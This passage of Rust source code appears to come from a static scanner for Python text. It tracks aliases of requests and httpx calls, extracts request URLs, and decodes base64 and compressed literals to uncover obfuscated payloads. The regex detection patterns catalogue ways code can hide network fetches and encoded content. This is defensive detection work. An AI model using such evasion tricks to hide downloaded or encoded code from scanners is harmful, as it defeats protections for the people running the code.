            let alias = if words.get(1).is_some_and(|w| w.eq_ignore_ascii_case("as")) {
                words.get(2).copied().unwrap_or(method)
            } else {
                method
            };
            if is_python_identifier(alias) {
                aliases.push(alias.to_string());
            }
        }
    }
    aliases.extend(collect_python_httpx_assigned_method_aliases(
        text,
        target_method,
        &module_aliases,
    ));
    aliases
}

fn collect_python_httpx_assigned_method_aliases(
    text: &str,
    target_method: &str,
    module_aliases: &[String],
) -> Vec<String> {
    if !text.as_bytes().contains(&b'=') {
        return Vec::new();
    }

    #[allow(clippy::expect_used)]
    static PY_HTTPX_METHOD_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?is)(?:^|[;"'\r\n])\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([A-Za-z_][A-Za-z0-9_]*)\.(get|post|put|patch|delete|head|options)\b"#)
            .expect("python httpx method assignment regex")
    });

    PY_HTTPX_METHOD_ASSIGN_RE
        .captures_iter(text)
        .take(8)
        .filter_map(|caps| {
            let alias = caps.get(1)?.as_str();
            let module = caps.get(2)?.as_str();
            let method = caps.get(3)?.as_str();
            if method == target_method && module_aliases.iter().any(|known| known == module) {
                Some(alias.to_string())
            } else {
                None
            }
        })
        .collect()
}

fn collect_python_httpx_module_aliases(text: &str) -> Vec<String> {
    #[allow(clippy::expect_used)]
    static PY_IMPORT_HTTPX_ALIAS_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?is)\bimport\s+httpx\s+as\s+([A-Za-z_][A-Za-z0-9_]*)"#)
            .expect("python httpx import alias regex")
    });

    let mut aliases = vec!["httpx".to_string()];
    aliases.extend(
        PY_IMPORT_HTTPX_ALIAS_RE
            .captures_iter(text)
            .take(8)
            .filter_map(|caps| caps.get(1).map(|m| m.as_str().to_string())),
    );
    aliases
}

fn collect_python_httpx_client_method_aliases(text: &str, target_method: &str) -> Vec<String> {
    if !contains_ascii_case_insensitive_atom(text, b"client") {
        return Vec::new();
    }

    collect_python_httpx_client_constructors(text)
        .into_iter()
        .map(|constructor| format!("{constructor}().{target_method}"))
        .collect()
}

fn collect_python_httpx_client_constructors(text: &str) -> Vec<String> {
    if !contains_ascii_case_insensitive_atom(text, b"client") {
        return Vec::new();
    }

    #[allow(clippy::expect_used)]
    static PY_FROM_HTTPX_IMPORT_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?is)\bfrom\s+httpx\s+import\s*(?:\(([^)]{0,512})\)|([^;"'\r\n]+))"#)
            .expect("python httpx from import regex")
    });

    let mut constructors: Vec<String> = collect_python_httpx_module_aliases(text)
        .into_iter()
        .map(|alias| format!("{alias}.Client"))
        .collect();
    for caps in PY_FROM_HTTPX_IMPORT_RE.captures_iter(text).take(8) {
        let Some(imports) = caps.get(1).or_else(|| caps.get(2)).map(|m| m.as_str()) else {
            continue;
        };
        for part in imports.split(',') {
            let part = part.trim().trim_matches(['(', ')']);
            let words: Vec<&str> = part.split_ascii_whitespace().collect();
            let Some(imported) = words.first().copied() else {
                continue;
            };
            if imported != "Client" {
                continue;
            }
            let alias = if words.get(1).is_some_and(|w| w.eq_ignore_ascii_case("as")) {
                words.get(2).copied().unwrap_or(imported)
            } else {
                imported
            };
            if is_python_identifier(alias) {
                constructors.push(alias.to_string());
            }
        }
    }
    constructors
}

fn collect_python_httpx_bound_client_method_aliases(
    text: &str,
    target_method: &str,
) -> Vec<String> {
    collect_python_httpx_bound_client_names(text)
        .into_iter()
        .map(|name| format!("{name}.{target_method}"))
        .collect()
}

fn collect_python_httpx_bound_client_names(text: &str) -> Vec<String> {
    if !contains_ascii_case_insensitive_atom(text, b"client") || !text.as_bytes().contains(&b'=') {
        return Vec::new();
    }

    #[allow(clippy::expect_used)]
    static PY_HTTPX_CLIENT_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?is)(?:^|[;"'\r\n])\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([A-Za-z_][A-Za-z0-9_]*(?:\.Client)?)\s*\(\s*\)"#,
        )
        .expect("python httpx client assignment regex")
    });

    let constructors = collect_python_httpx_client_constructors(text);
    PY_HTTPX_CLIENT_ASSIGN_RE
        .captures_iter(text)
        .take(8)
        .filter_map(|caps| {
            let name = caps.get(1)?.as_str();
            let constructor = caps.get(2)?.as_str();
            if constructors.iter().any(|known| known == constructor) {
                Some(name.to_string())
            } else {
                None
            }
        })
        .collect()
}

fn collect_python_httpx_bound_client_assigned_method_aliases(
    text: &str,
    target_method: &str,
) -> Vec<String> {
    if !text.as_bytes().contains(&b'=') {
        return Vec::new();
    }

    #[allow(clippy::expect_used)]
    static PY_HTTPX_BOUND_CLIENT_METHOD_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?is)(?:^|[;"'\r\n])\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([A-Za-z_][A-Za-z0-9_]*)\.(get|post|put|patch|delete|head|options)\b"#)
            .expect("python bound httpx client method assignment regex")
    });

    let clients = collect_python_httpx_bound_client_names(text);
    PY_HTTPX_BOUND_CLIENT_METHOD_ASSIGN_RE
        .captures_iter(text)
        .take(8)
        .filter_map(|caps| {
            let alias = caps.get(1)?.as_str();
            let client = caps.get(2)?.as_str();
            let method = caps.get(3)?.as_str();
            if method == target_method && clients.iter().any(|known| known == client) {
                Some(alias.to_string())
            } else {
                None
            }
        })
        .collect()
}

fn collect_python_requests_method_aliases(text: &str, target_method: &str) -> Vec<String> {
    let mut aliases = collect_python_requests_call_aliases(text, target_method);
    aliases.extend(collect_python_requests_assigned_method_aliases(
        text,
        target_method,
    ));
    aliases
        .extend(collect_python_requests_bound_session_assigned_method_aliases(text, target_method));
    aliases
}

fn collect_python_requests_call_aliases(text: &str, target_method: &str) -> Vec<String> {
    if !contains_ascii_case_insensitive_atom(text, b"from")
        && !contains_ascii_case_insensitive_atom(text, b" as ")
    {
        return Vec::new();
    }

    #[allow(clippy::expect_used)]
    static PY_IMPORT_REQUESTS_ALIAS_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?is)\bimport\s+requests\s+as\s+([A-Za-z_][A-Za-z0-9_]*)"#)
            .expect("python requests import alias regex")
    });
    #[allow(clippy::expect_used)]
    static PY_FROM_REQUESTS_IMPORT_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?is)\bfrom\s+requests\s+import\s*(?:\(([^)]{0,512})\)|([^;"'\r\n]+))"#)
            .expect("python requests from import regex")
    });

    let mut aliases: Vec<String> = PY_IMPORT_REQUESTS_ALIAS_RE
        .captures_iter(text)
        .take(8)
        .filter_map(|caps| {
            caps.get(1)
                .map(|m| format!("{}.{}", m.as_str(), target_method))
        })
        .collect();
    for caps in PY_FROM_REQUESTS_IMPORT_RE.captures_iter(text).take(8) {
        let Some(imports) = caps.get(1).or_else(|| caps.get(2)).map(|m| m.as_str()) else {
            continue;
        };
        for part in imports.split(',') {
            let part = part.trim().trim_matches(['(', ')']);
            let words: Vec<&str> = part.split_ascii_whitespace().collect();
            let Some(method) = words.first().copied() else {
                continue;
            };
            if method != target_method {
                continue;
            }
            let alias = if words.get(1).is_some_and(|w| w.eq_ignore_ascii_case("as")) {
                words.get(2).copied().unwrap_or(method)
            } else {
                method
            };
            if is_python_identifier(alias) {
                aliases.push(alias.to_string());
            }
        }
    }
    aliases
}

fn collect_python_requests_assigned_method_aliases(text: &str, target_method: &str) -> Vec<String> {
    if !text.as_bytes().contains(&b'=') {
        return Vec::new();
    }

    #[allow(clippy::expect_used)]
    static PY_REQUESTS_METHOD_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?is)(?:^|[;"'\r\n])\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([A-Za-z_][A-Za-z0-9_]*)\.(get|post|put|patch|delete|head|options|request)\b"#)
            .expect("python requests method assignment regex")
    });

    let module_aliases = collect_python_requests_module_aliases(text);
    PY_REQUESTS_METHOD_ASSIGN_RE
        .captures_iter(text)
        .take(8)
        .filter_map(|caps| {
            let alias = caps.get(1)?.as_str();
            let module = caps.get(2)?.as_str();
            let method = caps.get(3)?.as_str();
            if method == target_method && module_aliases.iter().any(|known| known == module) {
                Some(alias.to_string())
            } else {
                None
            }
        })
        .collect()
}

fn collect_python_requests_module_aliases(text: &str) -> Vec<String> {
    #[allow(clippy::expect_used)]
    static PY_IMPORT_REQUESTS_ALIAS_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?is)\bimport\s+requests\s+as\s+([A-Za-z_][A-Za-z0-9_]*)"#)
            .expect("python requests import alias regex")
    });

    let mut aliases = vec!["requests".to_string()];
    aliases.extend(
        PY_IMPORT_REQUESTS_ALIAS_RE
            .captures_iter(text)
            .take(8)
            .filter_map(|caps| caps.get(1).map(|m| m.as_str().to_string())),
    );
    aliases
}

fn collect_python_requests_session_method_aliases(text: &str, target_method: &str) -> Vec<String> {
    collect_python_requests_session_constructors(text)
        .into_iter()
        .map(|constructor| format!("{constructor}().{target_method}"))
        .collect()
}

fn collect_python_requests_session_constructors(text: &str) -> Vec<String> {
    if !contains_ascii_case_insensitive_atom(text, b"session") {
        return Vec::new();
    }

    #[allow(clippy::expect_used)]
    static PY_IMPORT_REQUESTS_ALIAS_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?is)\bimport\s+requests\s+as\s+([A-Za-z_][A-Za-z0-9_]*)"#)
            .expect("python requests import alias regex")
    });
    #[allow(clippy::expect_used)]
    static PY_FROM_REQUESTS_IMPORT_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?is)\bfrom\s+requests\s+import\s*(?:\(([^)]{0,512})\)|([^;"'\r\n]+))"#)
            .expect("python requests from import regex")
    });

    let mut constructors = vec!["requests.Session".to_string()];
    constructors.extend(
        PY_IMPORT_REQUESTS_ALIAS_RE
            .captures_iter(text)
            .take(8)
            .filter_map(|caps| caps.get(1).map(|m| format!("{}.Session", m.as_str()))),
    );
    for caps in PY_FROM_REQUESTS_IMPORT_RE.captures_iter(text).take(8) {
        let Some(imports) = caps.get(1).or_else(|| caps.get(2)).map(|m| m.as_str()) else {
            continue;
        };
        for part in imports.split(',') {
            let part = part.trim().trim_matches(['(', ')']);
            let words: Vec<&str> = part.split_ascii_whitespace().collect();
            let Some(method) = words.first().copied() else {
                continue;
            };
            if method != "Session" {
                continue;
            }
            let alias = if words.get(1).is_some_and(|w| w.eq_ignore_ascii_case("as")) {
                words.get(2).copied().unwrap_or(method)
            } else {
                method
            };
            if is_python_identifier(alias) {
                constructors.push(alias.to_string());
            }
        }
    }
    constructors
}

fn collect_python_requests_bound_session_method_aliases(
    text: &str,
    target_method: &str,
) -> Vec<String> {
    collect_python_requests_bound_session_names(text)
        .into_iter()
        .map(|name| format!("{name}.{target_method}"))
        .collect()
}

fn collect_python_requests_bound_session_names(text: &str) -> Vec<String> {
    if !contains_ascii_case_insensitive_atom(text, b"session") || !text.as_bytes().contains(&b'=') {
        return Vec::new();
    }

    #[allow(clippy::expect_used)]
    static PY_REQUESTS_SESSION_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?is)(?:^|[;"'\r\n])\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([A-Za-z_][A-Za-z0-9_]*(?:\.Session)?)\s*\(\s*\)"#,
        )
        .expect("python requests session assignment regex")
    });

    let constructors = collect_python_requests_session_constructors(text);
    PY_REQUESTS_SESSION_ASSIGN_RE
        .captures_iter(text)
        .take(8)
        .filter_map(|caps| {
            let name = caps.get(1)?.as_str();
            let constructor = caps.get(2)?.as_str();
            if constructors.iter().any(|known| known == constructor) {
                Some(name.to_string())
            } else {
                None
            }
        })
        .collect()
}

fn collect_python_requests_bound_session_assigned_method_aliases(
    text: &str,
    target_method: &str,
) -> Vec<String> {
    if !text.as_bytes().contains(&b'=') {
        return Vec::new();
    }

    #[allow(clippy::expect_used)]
    static PY_REQUESTS_BOUND_SESSION_METHOD_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?is)(?:^|[;"'\r\n])\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([A-Za-z_][A-Za-z0-9_]*)\.(get|post|put|patch|delete|head|options|request)\b"#)
            .expect("python bound requests session method assignment regex")
    });

    let sessions = collect_python_requests_bound_session_names(text);
    PY_REQUESTS_BOUND_SESSION_METHOD_ASSIGN_RE
        .captures_iter(text)
        .take(8)
        .filter_map(|caps| {
            let alias = caps.get(1)?.as_str();
            let session = caps.get(2)?.as_str();
            let method = caps.get(3)?.as_str();
            if method == target_method && sessions.iter().any(|known| known == session) {
                Some(alias.to_string())
            } else {
                None
            }
        })
        .collect()
}

fn find_python_requests_request_literals(text: &str) -> Vec<String> {
    let mut found = Vec::new();
    let mut names = vec!["requests.request".to_string()];
    names.extend(collect_python_requests_call_aliases(text, "request"));
    names.extend(collect_python_requests_assigned_method_aliases(
        text, "request",
    ));
    names.extend(collect_python_requests_session_method_aliases(
        text, "request",
    ));
    names.extend(collect_python_requests_bound_session_method_aliases(
        text, "request",
    ));
    names.extend(collect_python_requests_bound_session_assigned_method_aliases(text, "request"));
    let mut call_sites = Vec::new();
    for name in names {
        let mut search_start = 0;
        while let Some(name_start) = find_ascii_case_insensitive(text, &name, search_start) {
            let name_end = name_start + name.len();
            if !is_callable_name_boundary(text, name_start, name_end) {
                search_start = name_end;
                continue;
            }
            let open = skip_ascii_ws(text, name_end);
            if text.as_bytes().get(open) != Some(&b'(') {
                search_start = name_end;
                continue;
            }
            let Some(close) = find_matching_paren(text, open) else {
                search_start = open + 1;
                continue;
            };
            call_sites.push((open, close));
            search_start = close + 1;
        }
    }
    if call_sites.is_empty() {
        return found;
    }

    let string_bindings = collect_python_string_bindings(text);
    let url_bindings = collect_python_url_string_bindings_from(&string_bindings);

    for (open, close) in call_sites {
        if let Some(url) =
            python_requests_request_url(&text[open + 1..close], &url_bindings, &string_bindings)
        {
            found.push(url);
        }
    }

    found
}

fn python_requests_request_url(
    args: &str,
    url_bindings: &HashMap<String, String>,
    string_bindings: &HashMap<String, String>,
) -> Option<String> {
    let parts = split_python_top_level_args(args);
    if !python_requests_request_method_is_supported(&parts, string_bindings) {
        return None;
    }

    if let Some(url) = python_keyword_url_arg(&parts, "url", url_bindings) {
        return Some(url);
    }

    let method_is_keyword = parts.iter().any(|arg| python_arg_is_keyword(arg, "method"));
    let mut positional_args = parts
        .into_iter()
        .take(4)
        .filter(|arg| !python_arg_has_keyword(arg));
    if !method_is_keyword {
        positional_args.next();
    }
    positional_args
        .next()
        .and_then(|arg| python_url_arg_expr(arg, url_bindings))
}

fn python_requests_request_method_is_supported(
    parts: &[&str],
    bindings: &HashMap<String, String>,
) -> bool {
    if let Some(method) = python_keyword_string_arg(parts, "method", bindings) {
        return is_python_requests_download_method(&method);
    }
    parts
        .first()
        .and_then(|arg| python_string_arg(arg, bindings))
        .is_some_and(|method| is_python_requests_download_method(&method))
}

fn is_python_requests_download_method(method: &str) -> bool {
    matches!(
        method.to_ascii_uppercase().as_str(),
        "GET" | "POST" | "PUT" | "PATCH" | "DELETE" | "HEAD" | "OPTIONS"
    )
}

fn python_arg_is_keyword(arg: &str, keyword: &str) -> bool {
    arg.split_once('=')
        .is_some_and(|(key, _)| key.trim().eq_ignore_ascii_case(keyword))
}

fn python_arg_has_keyword(arg: &str) -> bool {
    arg.split_once('=')
        .is_some_and(|(key, _)| is_python_identifier(key.trim()))
}

fn decoded_python_b64decode_literals(deobfuscated: &str) -> Vec<String> {
    const PY_STRING_PREFIX_RE: &str = r#"(?:[rRuU]|[bB]|[rR][bB]|[bB][rR])?"#;
    #[allow(clippy::expect_used)]
    static PY_B64DECODE_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            &format!(
                r#"(?is)(?:base64|__import__\(\s*['"]base64['"]\s*\))\.(b64decode|urlsafe_b64decode)\s*\(\s*{PY_STRING_PREFIX_RE}['"]([^'"]+)['"]\s*([^)]{{0,128}})\)"#
            ),
        )
            .expect("python b64decode literal regex")
    });
    #[allow(clippy::expect_used)]
    static PY_B64DECODE_VAR_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?is)(?:base64|__import__\(\s*['"]base64['"]\s*\))\.(b64decode|urlsafe_b64decode)\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*([^)]{0,128})\)"#,
        )
            .expect("python b64decode variable regex")
    });
    #[allow(clippy::expect_used)]
    static PY_B64DECODE_MODULE_ALIAS_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            &format!(
                r#"(?is)\b([A-Za-z_][A-Za-z0-9_]*)\.(b64decode|urlsafe_b64decode)\s*\(\s*{PY_STRING_PREFIX_RE}['"]([^'"]+)['"]\s*([^)]{{0,128}})\)"#
            ),
        )
        .expect("python b64decode module alias literal regex")
    });
    #[allow(clippy::expect_used)]
    static PY_B64DECODE_MODULE_ALIAS_VAR_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?is)\b([A-Za-z_][A-Za-z0-9_]*)\.(b64decode|urlsafe_b64decode)\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*([^)]{0,128})\)"#,
        )
        .expect("python b64decode module alias variable regex")
    });
    #[allow(clippy::expect_used)]
    static PY_B64DECODE_ALIAS_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            &format!(
                r#"(?is)\b([A-Za-z_][A-Za-z0-9_]*)\s*\(\s*{PY_STRING_PREFIX_RE}['"]([^'"]+)['"]\s*([^)]{{0,128}})\)"#
            ),
        )
        .expect("python b64decode alias literal regex")
    });
    #[allow(clippy::expect_used)]
    static PY_B64DECODE_ALIAS_VAR_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?is)\b([A-Za-z_][A-Za-z0-9_]*)\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*([^)]{0,128})\)"#,
        )
        .expect("python b64decode alias variable regex")
    });

    let mut out = Vec::new();
    let mut seen = std::collections::HashSet::new();
    for caps in PY_B64DECODE_LITERAL_RE.captures_iter(deobfuscated).take(16) {
        let Some(method) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        let Some(b64) = caps.get(2).map(|m| m.as_str()) else {
            continue;
        };
        if !(32..=20_000).contains(&b64.len()) {
            continue;
        }
        if !is_python_base64_literal(b64) {
            continue;
        }
        let has_urlsafe_altchars = caps
            .get(3)
            .is_some_and(|m| python_b64_suffix_has_urlsafe_altchars(m.as_str()));
        decode_python_b64_payload(method, b64, has_urlsafe_altchars, &mut out, &mut seen);
    }

    let bindings = collect_python_b64_string_bindings(deobfuscated);
    let module_aliases = collect_python_base64_module_aliases(deobfuscated);
    let decoder_aliases = collect_python_base64_decoder_aliases(deobfuscated, &module_aliases);
    for caps in PY_B64DECODE_VAR_RE.captures_iter(deobfuscated).take(16) {
        let Some(method) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        let Some(name) = caps.get(2).map(|m| m.as_str()) else {
            continue;
        };
        let Some(b64) = bindings.get(name).map(String::as_str) else {
            continue;
        };
        let has_urlsafe_altchars = caps
            .get(3)
            .is_some_and(|m| python_b64_suffix_has_urlsafe_altchars(m.as_str()));
        decode_python_b64_payload(method, b64, has_urlsafe_altchars, &mut out, &mut seen);
    }

    for caps in PY_B64DECODE_MODULE_ALIAS_LITERAL_RE
        .captures_iter(deobfuscated)
        .take(32)
    {
        let Some(module_name) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        if !module_aliases.contains(module_name) {
            continue;
        }
        let Some(method) = caps.get(2).map(|m| m.as_str()) else {
            continue;
        };
        let Some(b64) = caps.get(3).map(|m| m.as_str()) else {
            continue;
        };
        let has_urlsafe_altchars = caps
            .get(4)
            .is_some_and(|m| python_b64_suffix_has_urlsafe_altchars(m.as_str()));
        decode_python_b64_payload(method, b64, has_urlsafe_altchars, &mut out, &mut seen);
    }

    for caps in PY_B64DECODE_MODULE_ALIAS_VAR_RE
        .captures_iter(deobfuscated)
        .take(32)
    {
        let Some(module_name) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        if !module_aliases.contains(module_name) {
            continue;
        }
        let Some(method) = caps.get(2).map(|m| m.as_str()) else {
            continue;
        };
        let Some(var_name) = caps.get(3).map(|m| m.as_str()) else {
            continue;
        };
        let Some(b64) = bindings.get(var_name).map(String::as_str) else {
            continue;
        };
        let has_urlsafe_altchars = caps
            .get(4)
            .is_some_and(|m| python_b64_suffix_has_urlsafe_altchars(m.as_str()));
        decode_python_b64_payload(method, b64, has_urlsafe_altchars, &mut out, &mut seen);
    }

    for caps in PY_B64DECODE_ALIAS_LITERAL_RE
        .captures_iter(deobfuscated)
        .take(32)
    {
        let Some(name) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        let Some(method) = decoder_aliases.get(name).map(String::as_str) else {
            continue;
        };
        let Some(b64) = caps.get(2).map(|m| m.as_str()) else {
            continue;
        };
        let has_urlsafe_altchars = caps
            .get(3)
            .is_some_and(|m| python_b64_suffix_has_urlsafe_altchars(m.as_str()));
        decode_python_b64_payload(method, b64, has_urlsafe_altchars, &mut out, &mut seen);
    }

    for caps in PY_B64DECODE_ALIAS_VAR_RE
        .captures_iter(deobfuscated)
        .take(32)
    {
        let Some(name) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        let Some(method) = decoder_aliases.get(name).map(String::as_str) else {
            continue;
        };
        let Some(var_name) = caps.get(2).map(|m| m.as_str()) else {
            continue;
        };
        let Some(b64) = bindings.get(var_name).map(String::as_str) else {
            continue;
        };
        let has_urlsafe_altchars = caps
            .get(3)
            .is_some_and(|m| python_b64_suffix_has_urlsafe_altchars(m.as_str()));
        decode_python_b64_payload(method, b64, has_urlsafe_altchars, &mut out, &mut seen);
    }
    out
}

fn collect_python_base64_module_aliases(deobfuscated: &str) -> std::collections::HashSet<String> {
    #[allow(clippy::expect_used)]
    static PY_IMPORT_BASE64_ALIAS_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?is)\bimport\s+base64\s+as\s+([A-Za-z_][A-Za-z0-9_]*)"#)
            .expect("python import base64 alias regex")
    });

    let mut aliases = std::collections::HashSet::new();
    aliases.insert("base64".to_string());
    for caps in PY_IMPORT_BASE64_ALIAS_RE
        .captures_iter(deobfuscated)
        .take(16)
    {
        let Some(alias) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        aliases.insert(alias.to_string());
    }
    aliases
}

fn collect_python_base64_decoder_aliases(
    deobfuscated: &str,
    module_aliases: &std::collections::HashSet<String>,
) -> std::collections::HashMap<String, String> {
    #[allow(clippy::expect_used)]
    static PY_FROM_BASE64_IMPORT_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?is)\bfrom\s+base64\s+import\s*(?:\(([^)]{0,512})\)|([^;"'\r\n]+))"#)
            .expect("python from base64 import regex")
    });
    #[allow(clippy::expect_used)]
    static PY_BASE64_DECODER_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?is)(?:^|[;"'\r\n])\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([A-Za-z_][A-Za-z0-9_]*)\.(b64decode|urlsafe_b64decode)\b"#,
        )
        .expect("python base64 decoder assignment regex")
    });
    #[allow(clippy::expect_used)]
    static PY_DUNDER_IMPORT_BASE64_DECODER_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?is)(?:^|[;"'\r\n])\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*__import__\(\s*['"]base64['"]\s*\)\.(b64decode|urlsafe_b64decode)\b"#,
        )
        .expect("python __import__ base64 decoder assignment regex")
    });

    let mut aliases = std::collections::HashMap::new();
    for caps in PY_FROM_BASE64_IMPORT_RE.captures_iter(deobfuscated).take(8) {
        let Some(imports) = caps.get(1).or_else(|| caps.get(2)).map(|m| m.as_str()) else {
            continue;
        };
        for part in imports.split(',') {
            let part = part.trim().trim_matches(['(', ')']);
            if part == "*" {
                aliases.insert("b64decode".to_string(), "b64decode".to_string());
                aliases.insert(
                    "urlsafe_b64decode".to_string(),
                    "urlsafe_b64decode".to_string(),
                );
                continue;
            }
            let words: Vec<&str> = part.split_ascii_whitespace().collect();
            let Some(method) = words.first().copied() else {
                continue;
            };
            if !matches!(method, "b64decode" | "urlsafe_b64decode") {
                continue;
            }
            let alias = if words.get(1).is_some_and(|w| w.eq_ignore_ascii_case("as")) {
                words.get(2).copied().unwrap_or(method)
            } else {
                method
            };
            if is_python_identifier(alias) {
                aliases.insert(alias.to_string(), method.to_string());
            }
        }
    }
    for caps in PY_BASE64_DECODER_ASSIGN_RE
        .captures_iter(deobfuscated)
        .take(16)
    {
        let Some(alias) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        if !is_python_identifier(alias) {
            continue;
        }
        let Some(module_name) = caps.get(2).map(|m| m.as_str()) else {
            continue;
        };
        if !module_aliases.contains(module_name) {
            continue;
        }
        let Some(method) = caps.get(3).map(|m| m.as_str()) else {
            continue;
        };
        aliases.insert(alias.to_string(), method.to_string());
    }
    for caps in PY_DUNDER_IMPORT_BASE64_DECODER_ASSIGN_RE
        .captures_iter(deobfuscated)
        .take(16)
    {
        let Some(alias) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        if !is_python_identifier(alias) {
            continue;
        }
        let Some(method) = caps.get(2).map(|m| m.as_str()) else {
            continue;
        };
        aliases.insert(alias.to_string(), method.to_string());
    }
    aliases
}

fn collect_python_b64_string_bindings(
    deobfuscated: &str,
) -> std::collections::HashMap<String, String> {
    const PY_STRING_PREFIX_RE: &str = r#"(?:[rRuU]|[bB]|[rR][bB]|[bB][rR])?"#;
    #[allow(clippy::expect_used)]
    static PY_STRING_BINDING_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            &format!(
                r#"(?is)(?:^|[;"'\r\n])\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*{PY_STRING_PREFIX_RE}['"]([^'"]+)['"]"#
            ),
        )
        .expect("python string binding regex")
    });
    #[allow(clippy::expect_used)]
    static PY_STRING_CONCAT_BINDING_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            &format!(
                r#"(?is)(?:^|[;"'\r\n])\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*({PY_STRING_PREFIX_RE}['"][^'"]+['"](?:\s*(?:\+\s*)?{PY_STRING_PREFIX_RE}['"][^'"]+['"])*)"#
            ),
        )
        .expect("python string concat binding regex")
    });

    let mut bindings = std::collections::HashMap::new();
    for caps in PY_STRING_BINDING_RE.captures_iter(deobfuscated).take(64) {
        let Some(name) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        let Some(value) = caps.get(2).map(|m| m.as_str()) else {
            continue;
        };
        if !(32..=20_000).contains(&value.len()) || !is_python_base64_literal(value) {
            continue;
        }
        bindings.insert(name.to_string(), value.to_string());
    }
    for caps in PY_STRING_CONCAT_BINDING_RE
        .captures_iter(deobfuscated)
        .take(32)
    {
        let Some(name) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        let Some(expr) = caps.get(2).map(|m| m.as_str()) else {
            continue;
        };
        let Some(value) = collect_python_concat_string_literals(expr) else {
            continue;
        };
        if !(32..=20_000).contains(&value.len()) || !is_python_base64_literal(&value) {
            continue;
        }
        bindings.insert(name.to_string(), value);
    }
    bindings
}

fn collect_python_concat_string_literals(expr: &str) -> Option<String> {
    const PY_STRING_PREFIX_RE: &str = r#"(?:[rRuU]|[bB]|[rR][bB]|[bB][rR])?"#;
    #[allow(clippy::expect_used)]
    static PY_STRING_LITERAL_PART_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(&format!(r#"(?is){PY_STRING_PREFIX_RE}['"]([^'"]+)['"]"#))
            .expect("python string literal part regex")
    });

    let mut out = String::new();
    let mut parts = 0usize;
    for caps in PY_STRING_LITERAL_PART_RE.captures_iter(expr).take(64) {
        let Some(value) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        out.push_str(value);
        parts += 1;
        if out.len() > 20_000 {
            return None;
        }
    }
    (parts >= 2).then_some(out)
}

fn is_python_identifier(s: &str) -> bool {
    let mut chars = s.chars();
    let Some(first) = chars.next() else {
        return false;
    };
    (first == '_' || first.is_ascii_alphabetic())
        && chars.all(|ch| ch == '_' || ch.is_ascii_alphanumeric())
}

fn decode_python_b64_payload(
    method: &str,
    b64: &str,
    has_urlsafe_altchars: bool,
    out: &mut Vec<String>,
    seen: &mut std::collections::HashSet<String>,
) {
    use base64::Engine;

    if !(32..=20_000).contains(&b64.len()) {
        return;
    }
    if !is_python_base64_literal(b64) {
        return;
    }
    if !seen.insert(b64.to_string()) {
        return;
    }
    let decoded = if method.eq_ignore_ascii_case("urlsafe_b64decode") || has_urlsafe_altchars {
        base64::engine::general_purpose::URL_SAFE
            .decode(b64)
            .or_else(|_| base64::engine::general_purpose::URL_SAFE_NO_PAD.decode(b64))
    } else {
        base64::engine::general_purpose::STANDARD.decode(b64)
    };
    let Ok(decoded) = decoded else {
        return;
    };
    out.extend(decoded_python_literal_payloads(&decoded));
}

fn decoded_python_literal_payloads(decoded: &[u8]) -> Vec<String> {
    let mut out = Vec::new();
    if decoded.len() <= 64 * 1024 {
        if let Ok(text) = std::str::from_utf8(decoded) {
            out.push(text.to_string());
        }
    }
    if let Some(text) = inflate_python_literal_zlib(decoded) {
        out.push(text);
    }
    if let Some(text) = inflate_python_literal_gzip(decoded) {
        out.push(text);
    }
    out
}

fn inflate_python_literal_zlib(decoded: &[u8]) -> Option<String> {
